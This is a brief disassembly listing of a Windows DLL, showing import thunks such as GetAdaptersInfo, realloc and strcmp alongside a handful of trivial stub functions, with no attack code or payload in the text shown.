jmp [ _EH_prolog@IAT ]
realloc
jmp [ realloc@IAT ]
_initterm
jmp [ _initterm@IAT ]
GetAdaptersInfo
jmp [ GetAdaptersInfo@IAT ]
sub_10002bed
push 0x1
pop eax
retn
sub_10002d6f
push 0x0
call sub_10002d77
retn
sub_1000303c
xor eax eax
push eax
push eax
push eax
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_10003051
retn 0x8
sub_10003555
push 0x1
pop eax
retn
sub_10003ac0
push 0x1
pop eax
retn
sub_10003b56
push 0x1
pop eax
retn
sub_10003c72
push 0x1
pop eax
retn
sub_10003da5
push 0x1
pop eax
retn
sub_1000415e
mov eax [ esp + 0xc ]
inc eax
retn 0xc
sub_1000419b
push [ esp + 0xc ]
mov [ ecx ] 0x1
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_10004083
retn 0xc
sub_100041b5
push [ esp + 0xc ]
mov [ ecx + 0x4 ] 0x1
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_10004083
retn 0xc
_except_handler3
jmp [ _except_handler3@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
strcmp
jmp [ strcmp@IAT ]
_strdup
jmp [ _strdup@IAT ]
sub_100042e0
mov eax r--data
jmp __CxxFrameHandler
